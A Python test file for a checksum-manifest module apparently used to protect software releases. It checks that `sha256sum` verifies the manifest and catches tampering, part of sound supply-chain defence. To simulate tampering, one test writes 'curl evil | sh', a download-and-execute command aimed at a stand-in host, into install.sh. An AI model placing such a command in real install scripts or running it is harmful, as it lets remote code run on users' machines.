"""SHA256SUMS manifests in the exact format `sha256sum --strict -c` accepts."""

import pathlib
import subprocess

from supplychain.checksums import manifest_text, sha256_file, write_manifest


def tree(root: pathlib.Path) -> pathlib.Path:
    (root / "wheels").mkdir(parents=True)
    (root / "wheels" / "a-1.0-py3-none-any.whl").write_bytes(b"wheel")
    (root / "install.sh").write_text("#!/bin/sh\n")
    (root / "VERSION").write_text("sentinel 0.2.0\n")
    return root


def test_sha256_of_a_known_input():
    # FIPS 180-2 test vector for "abc"
    import tempfile

    with tempfile.NamedTemporaryFile() as f:
        f.write(b"abc")
        f.flush()
        assert sha256_file(pathlib.Path(f.name)) == "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad"


def test_every_file_is_listed_once_sorted_by_relative_posix_path(tmp_path):
    lines = manifest_text(tree(tmp_path)).splitlines()
    assert [line.split("  ", 1)[1] for line in lines] == ["VERSION", "install.sh", "wheels/a-1.0-py3-none-any.whl"]


def test_the_manifest_never_lists_itself(tmp_path):
    root = tree(tmp_path)
    write_manifest(root)
    write_manifest(root)  # regenerating must not hash the previous manifest
    assert "SHA256SUMS" not in (root / "SHA256SUMS").read_text()


def test_sha256sum_accepts_the_manifest_and_rejects_a_tampered_file(tmp_path):
    root = tree(tmp_path)
    write_manifest(root)
    ok = subprocess.run(["sha256sum", "--quiet", "--strict", "-c", "SHA256SUMS"], cwd=root, capture_output=True)
    assert ok.returncode == 0, ok.stderr
    (root / "install.sh").write_text("#!/bin/sh\ncurl evil | sh\n")
    bad = subprocess.run(["sha256sum", "--quiet", "--strict", "-c", "SHA256SUMS"], cwd=root, capture_output=True)
    assert bad.returncode != 0
